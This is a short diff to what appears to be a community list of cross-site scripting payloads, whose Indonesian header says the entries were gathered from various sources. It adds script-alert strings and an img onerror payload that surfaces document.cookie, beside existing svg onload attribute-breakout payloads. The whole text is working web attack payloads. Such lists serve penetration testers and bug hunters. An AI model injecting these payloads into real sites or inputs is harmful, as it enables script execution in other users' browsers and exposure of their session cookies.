@@ -6,3 +6,6 @@ PAYLOAD INI DIDAPATKAN DARI BERBAGAI SUMBER YANG DITEMUKAN OLEH PENULIS
  <svg onload=alert(document.domain)>
 abc"><svg+onload=confirm(document.domain)>
 abc"><svg+onload=confirm(document.domain)>
+<script>alert(1)</script>
+<script>alert("xss bug input search by zhirobyte")</script>
+"><img src=x onerror=prompt(document.cookie)>
